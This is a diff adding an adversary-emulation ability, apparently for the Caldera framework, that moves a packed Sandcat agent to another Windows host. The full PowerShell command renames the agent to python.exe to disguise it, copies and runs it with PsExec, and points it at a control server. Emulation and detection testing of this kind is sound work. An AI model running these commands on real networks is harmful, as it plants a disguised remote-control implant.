@@ -1,0 +1,17 @@
+---
+ - id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
+   name: 8.B Copy Sandcat File
+   description: Copy Sandcat file using PsExec
+   tactic: lateral-movement
+   technique:
+     attack_id: T1105
+     name: Remote File Copy
+   platforms:
+     windows:
+       psh,pwsh:
+         command: |
+           move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+           set-location "C:\Program Files\SysinternalsSuite\";
+           .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
+           tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";
+         payload: sandcat.go-windows-upx
